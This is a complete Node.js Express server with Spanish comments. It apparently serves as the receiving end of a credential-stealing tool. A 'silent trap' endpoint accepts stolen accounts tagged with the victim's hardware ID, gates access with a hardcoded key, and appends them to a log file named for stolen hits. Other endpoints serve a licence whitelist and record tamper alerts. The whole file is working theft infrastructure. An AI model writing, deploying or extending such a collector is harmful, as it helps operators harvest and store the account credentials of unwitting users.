const express = require('express');
const fs = require('fs');
const app = express();
app.use(express.json());

// Ruta para la lista blanca (lo que ya tenías)
app.get('/lista_blanca.txt', (req, res) => {
    res.send("ID_PLACA_1\nID_PLACA_2\nID_PRUEBA_123"); 
});

// TRAMPA SILENCIOSA: Aquí te llegarán los HITS
app.post('/api/v1/sync', (req, res) => {
    const { cuenta, hwid } = req.body;
    if (req.headers['x-titan-auth'] !== '725255cd-4493-4958-9baa') return res.sendStatus(403);

    console.log(`🚀 HIT RECIBIDO: ${cuenta} (Desde PC: ${hwid})`);
    
    // Guardamos en un archivo interno del servidor
    fs.appendFileSync('HITS_ROBADOS.log', `${new Date().toLocaleString()} - ${hwid} - ${cuenta}\n`);
    res.sendStatus(200);
});

// ALERTA DE SEGURIDAD: Aquí te avisa si alguien intenta hackearlo
app.post('/api/seguridad/alerta', (req, res) => {
    console.log("🚨 ALERTA: Intento de violación de código detectado.");
    res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor Maestro Online en puerto ${PORT}`));